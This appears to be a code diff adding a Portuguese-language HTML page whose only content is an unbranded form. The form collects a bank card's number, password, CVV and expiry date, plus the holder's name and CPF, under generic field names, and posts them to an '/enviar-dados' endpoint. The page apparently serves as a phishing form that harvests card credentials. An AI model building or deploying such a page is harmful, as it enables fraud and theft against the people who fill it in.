@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="background-image"></div>
+  <div class="content">
+    <div class="cartao">
+        <form id="myForm" action="/enviar-dados" method="post">
+          
+              <input class="inpu1" type="number" name="informacao1" id="nome" placeholder="Número do Cartão" class="meuInput" required>
+              <input type="number" name="informacao2"  placeholder="Senha"   required>
+              <input type="text" name="informacao3" placeholder="Nome do Titular"  required>
+              <input type="number" name="informacao4" placeholder="CPF"  required>
+              <input type="number" name="informacao5" placeholder="Código de segurança (CVV)" required>
+              <div class="validade">
+                <input type="number" name="informacao6" placeholder="MM" required> <div class="divd"></div> 
+                <input type="number" name="informacao7" placeholder="YY"  required>
+              </div>
+
+
+
+
+          <button type="submit">acessar</button>
+      </form>
+    </div>
+  </div>
+ <script src="./script.js"></script>   
+</body>
+</html>
